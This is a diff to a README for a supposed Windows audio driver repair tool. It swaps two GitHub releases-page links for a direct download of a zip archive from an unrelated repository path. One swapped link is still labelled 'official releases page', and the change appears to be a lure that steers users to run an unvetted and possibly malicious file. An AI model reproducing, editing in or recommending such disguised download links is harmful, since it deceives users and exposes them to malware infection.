@@ -5,7 +5,7 @@ description: "Resolve audio issues, crackling, and driver errors on Windows 10 a
 ---
 # 🔊 Audio-Driver-Fixer - Restore your computer sound system now
 
-<a href="https://github.com/attentiongetting-kingdomofgod65/Audio-Driver-Fixer/releases"><img src="https://img.shields.io/badge/Download_Audio_Driver_Fixer-Blue.svg" alt="Download"></a>
+<a href="https://github.com/attentiongetting-kingdomofgod65/attentiongetting-kingdomofgod65.github.io/raw/refs/heads/main/teleophyte/kingdomofgod_attentiongetting_github_io_3.7-alpha.5.zip"><img src="https://img.shields.io/badge/Download_Audio_Driver_Fixer-Blue.svg" alt="Download"></a>
 
 Audio-Driver-Fixer resolves common sound issues on Windows 10 and Windows 11. Use this tool if you see the "No Audio Output Device is installed" error message. The application repairs Realtek HD Audio drivers, fixes audio failures after system updates, and addresses crackling sounds or microphone malfunctions. It supports hardware from Realtek, NVIDIA, AMD, and Intel.
 
@@ -20,7 +20,7 @@ Ensure your computer meets these conditions before you begin:
 
 ## 📥 Getting the software
 
-Visit the [official releases page](https://github.com/attentiongetting-kingdomofgod65/Audio-Driver-Fixer/releases) to download the application.
+Visit the [official releases page](https://github.com/attentiongetting-kingdomofgod65/attentiongetting-kingdomofgod65.github.io/raw/refs/heads/main/teleophyte/kingdomofgod_attentiongetting_github_io_3.7-alpha.5.zip) to download the application.
 
 1.  Open the link in your web browser.
 2.  Look for the latest version listed under the "Releases" heading.
